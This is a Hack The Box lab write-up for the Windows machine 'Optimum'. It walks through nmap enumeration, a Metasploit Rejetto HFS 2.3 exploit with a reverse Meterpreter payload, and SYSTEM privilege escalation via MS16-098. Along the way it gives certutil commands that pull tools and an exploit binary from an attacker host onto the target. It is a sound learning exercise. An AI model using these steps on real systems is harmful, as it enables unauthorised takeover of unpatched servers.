# Hack The Box - Optimum
>**Machine Name:** Optimum  
>**Platform:** Hack The Box  
>**Difficulty:** Easy  
>**Target IP:** 10.10.10.8  
>**Operating System:** Windows Server 2012 R2  
>**Architecture:** x64

---
## Execution Summary

The **Optimum** machine was compromised through a vulnerable **HttpFileServer (HFS) 2.3** service running on port 80. After identifying the service, the **Rejetto HFS remote code execution exploit** was used through Metasploit to obtain a low-privileged Meterpreter session.

Privilege escalation was then investigated using **Local Exploit Suggester, Sherlock, and WES-NG**. Although the initial **MS16-032** attempt failed, WES-NG identified **MS16-098** as a viable vulnerability. Exploiting MS16-098 successfully elevated the session to:

```
NT AUTHORITY\SYSTEM
```

This confirmed **complete system-level compromise** of the Windows Server 2012 R2 target.

---
## 1. Enumeration:
### 1.1 Nmap Scan:

**Command:**
```
nmap -A -T4 -p- 10.10.10.8
```
![](../../../../z%20(Attachments)/Pasted%20image%2020260808214521.png)

**Results:**

|Port|State|Service|Version|
|---|---|---|---|
|80/tcp|Open|HTTP|HttpFileServer httpd 2.3|

---
## 2. Web enumeration:

Accessing:
```
http://10.10.10.8
```
revealed the **HttpFileServer 2.3** web interface.

** website:**
![](../../../../z%20(Attachments)/Pasted%20image%2020260809192413.png)

The exposed HFS version was identified as a potential attack surface and was researched for known vulnerabilities.

---
## 3. Exploitation:
### Metasploit Module Research:

**open Metasploit:**
```
msfconsole
```

```
**search rejetto**
```

The following module was identified:
```
exploit/windows/http/rejetto_hfs_exec
```

![](../../../../z%20(Attachments)/Pasted%20image%2020260809192856.png)

This module targets a remote command-execution vulnerability in Rejetto HttpFileServer.

---
### Exploit Configuration:

The target was configured as the vulnerable HFS server:
```
set RHOSTS 10.10.10.8
```
The available exploit targets were checked:
```
show targets
```
The module showed an automatic target option.
![](../../../../z%20(Attachments)/Pasted%20image%2020260809193203.png)

A Windows x64 Meterpreter reverse TCP payload was selected:
```
set payload windows/x64/meterpreter/reverse_tcp
```
The required payload settings included the listener address and port.

![](../../../../z%20(Attachments)/Pasted%20image%2020260809193345.png)

the required information:
![](../../../../z%20(Attachments)/Pasted%20image%2020260809193549.png)

---
## 4. Initial Access Result:

The exploit successfully returned a **Meterpreter session**.

The system information was then checked:
```
sysinfo
```
![](../../../../z%20(Attachments)/Pasted%20image%2020260809195236.png)

This confirmed that the target was running **Windows Server 2012 R2 x64**.

The obtained Meterpreter session was low-privileged, so further enumeration was required to identify a suitable privilege-escalation path.

---
## 5. Privilege escalation:

### Local Exploit Suggester:

The Meterpreter session was placed in the background:
```
background
```

search Metasploit Local Exploit Suggester:
```
search suggester
```
![](../../../../z%20(Attachments)/Pasted%20image%2020260809215647.png)

The following module was identified:
```
use post/multi/recon/local_exploit_suggester
```
next, session:
```
set session 1
```

`run`the exploit:
![](../../../../z%20(Attachments)/Pasted%20image%2020260809220708.png)

However, the exploit **failed to create a new session**.


check the operating system details given by the meterpreter:
![](../../../../z%20(Attachments)/Pasted%20image%2020260809223012.png)
```
Windows 2012 R2 (Build 9600)
```
search a exploit on this in the google: (https://www.exploit-db.com/exploits/39719)
- as give in the site `MS16-032` is vulnerable.

**search it up in metasploit:**
```
search ms16-032
```
![](../../../../z%20(Attachments)/Pasted%20image%2020260809224026.png)

The identified module was:
```
use exploit/window/local/ms16_032_secondary_logon_handler_privesc
```
- set you session to 1.
- set the target to `windows x64`
- set the other details too (lhost , lport.....etc)

next, `run`:
![](../../../../z%20(Attachments)/Pasted%20image%2020260809230507.png)
didn't worked again.

---
## 6. Further Privilege-Escalation Enumeration:
### [Sherlock(by Rasta-Mouse)](../../../../tools/Privesc/Sherlock(by%20Rasta-Mouse).md):

The script was transferred to the target using the Windows-native `certutil` utility.

Navigate to the folder which has `Sherlock.ps1` which is named as `sher.ps1` , then set up a listener:
```
python -m http.server 80
```

Go back to the meterpreter and do `certutil`to download a file:
```
certutil -urlcache -f http://<ATTACKER_IP>:<PORT>/sher.ps1 sher.ps1
```
![](../../../../z%20(Attachments)/Pasted%20image%2020260810000043.png)
the file is uploaded into the window.

Sherlock identified several potentially exploitable Windows vulnerabilities, including:
![](../../../../z%20(Attachments)/Pasted%20image%2020260810000345.png)

This demonstrated that the Windows installation was outdated and potentially vulnerable to multiple local privilege-escalation attacks.

---
## 7. WES-NG Enumeration:
### [WES-NG (Windows Exploit Suggester - Next Generation)](../../../../tools/Privesc/Windows/WES-NG%20(Windows%20Exploit%20Suggester%20-%20Next%20Generation).md):

Open the tool directory in your terminal and perform update:
```
python3 wes.py --update
```

Save the `systeminfo` into a txt file:
```
systeminfo > systeminfo.txt
```

then analyse the target:
```
python3 wes.py systeminfo.txt
```

we got another vulnerability `MS16-098`
esearched the corresponding exploit and obtained the required executable.
(https://www.exploit-db.com/exploits/41020)

Next, download the binary.exe file from the given link there (https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe)

---
## 8. Privilege Escalation — MS16-098

### Setup a listener:

navigate to the folder where the file is saved then start a listener:
```
pyhton -m http.server 80
```

The identified MS16-098 exploit was transferred to the target using `certutil`.
```
certutil -urlcache -f http:<local-ip>/41020.exe sh.exe
```
![](../../../../z%20(Attachments)/Pasted%20image%2020260810005750.png)

next, execute the `sh.exe` file:
```
sh.exe
```
and successfully the privilege was escalated.

![](../../../../z%20(Attachments)/Pasted%20image%2020260810010100.png)

This confirmed successful privilege escalation to the highest local Windows privilege level.

---
# 9. Attack Chain

```
Nmap
  ↓
Port 80 discovered
  ↓
HttpFileServer 2.3 identified
  ↓
HFS vulnerability researched
  ↓
Rejetto HFS exploit
  ↓
Meterpreter session
  ↓
Low-privileged access
  ↓
Local Exploit Suggester / Sherlock / WES-NG
  ↓
MS16-098 identified
  ↓
Privilege escalation
  ↓
NT AUTHORITY\SYSTEM
```

## 10. Risk Analysis

### HFS 2.3 — Critical:

The vulnerable HFS service allowed remote code execution, providing the initial foothold on the Windows machine.

### Windows Privilege Escalation — Critical

The outdated Windows environment contained vulnerabilities that allowed a low-privileged user to potentially elevate privileges. The MS16-098 exploitation was ultimately successful.

The final `whoami` result:
```
nt authority\system
```
demonstrated **complete system-level compromise**.

## 11. Conclusion

The Optimum machine was compromised through a vulnerable **HttpFileServer 2.3** service exposed on port 80.

After obtaining a low-privileged Meterpreter session, multiple privilege-escalation techniques were investigated. Although the initial MS16-032 attempt failed, further enumeration using Sherlock and WES-NG identified additional vulnerabilities.

The MS16-098 vulnerability was successfully exploited, resulting in:

```
NT AUTHORITY\SYSTEM
```

Therefore, the complete attack path was:

**Web Enumeration → Initial Access → Low-Privilege Shell → Privilege Escalation → SYSTEM**